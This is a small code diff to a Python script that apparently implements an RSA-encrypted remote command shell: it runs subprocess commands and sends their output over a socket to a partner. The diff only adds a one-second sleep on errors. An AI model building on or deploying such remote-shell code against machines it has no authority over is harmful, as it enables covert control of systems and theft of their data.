@@ -4,6 +4,7 @@ import os
 import socket
 import subprocess
 import rsa
+import time
 
 public_key, private_key = rsa.newkeys(2048)
 public_partner = None
@@ -35,6 +36,7 @@ while 1:
 			output_str = str(stdout_value, "UTF-8")
 			s.send(rsa.encrypt(str.encode("\n" + output_str + "\n"), public_partner))
 	except Exception as e:
+		time.sleep(1)		
 		continue
     
 s.close()
